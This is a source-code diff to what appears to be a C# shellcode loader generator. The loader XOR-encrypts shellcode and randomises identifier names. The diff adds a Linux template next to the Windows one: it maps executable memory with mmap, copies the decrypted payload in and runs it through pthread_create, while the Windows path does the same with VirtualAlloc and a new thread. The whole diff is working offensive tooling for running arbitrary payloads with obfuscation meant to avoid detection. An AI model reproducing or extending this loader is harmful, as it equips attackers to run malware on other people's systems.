@@ -14,7 +14,14 @@ internal static class Loader
         var (data, keys) = Xor.Encrypt(shellcode, cfg.XorRounds, cfg.Seed.HasValue ? naming.Rng : null);
         var decrypt = Indent(Xor.Routine(buf, data, keys), "    ");
 
-        return $$"""
+        return cfg.Platform switch
+        {
+            TargetPlatform.Windows => Windows(),
+            TargetPlatform.Linux => Linux(),
+            _ => throw new ArgumentOutOfRangeException(nameof(cfg.Platform), cfg.Platform, null)
+        };
+
+        string Windows() => $$"""
         [System.Runtime.InteropServices.DllImport("kernel32", EntryPoint = "VirtualAlloc")]
         static extern System.IntPtr {{alloc}}(System.IntPtr a, uint s, uint t, uint p);
 
@@ -31,6 +38,27 @@ internal static class Loader
             System.Runtime.InteropServices.Marshal.Copy({{buf}}, 0, {{page}}, {{buf}}.Length);
             var {{thread}} = {{spawn}}(System.IntPtr.Zero, 0u, {{page}}, System.IntPtr.Zero, 0u, System.IntPtr.Zero);
             {{wait}}({{thread}}, 0xFFFFFFFFu);
+            return true;
+        }
+        """;
+
+        string Linux() => $$"""
+        [System.Runtime.InteropServices.DllImport("libc", EntryPoint = "mmap")]
+        static extern System.IntPtr {{alloc}}(System.IntPtr a, System.UIntPtr l, int p, int f, int fd, System.IntPtr o);
+
+        [System.Runtime.InteropServices.DllImport("libc", EntryPoint = "pthread_create")]
+        static extern int {{spawn}}(out System.IntPtr t, System.IntPtr a, System.IntPtr s, System.IntPtr p);
+
+        [System.Runtime.InteropServices.DllImport("libc", EntryPoint = "pthread_join")]
+        static extern int {{wait}}(System.IntPtr t, System.IntPtr r);
+
+        public override bool Execute()
+        {
+        {{decrypt}}
+            var {{page}} = {{alloc}}(System.IntPtr.Zero, (System.UIntPtr)(uint){{buf}}.Length, 7, 0x22, -1, System.IntPtr.Zero);
+            System.Runtime.InteropServices.Marshal.Copy({{buf}}, 0, {{page}}, {{buf}}.Length);
+            {{spawn}}(out var {{thread}}, System.IntPtr.Zero, {{page}}, System.IntPtr.Zero);
+            {{wait}}({{thread}}, System.IntPtr.Zero);
             return true;
         }
         """;
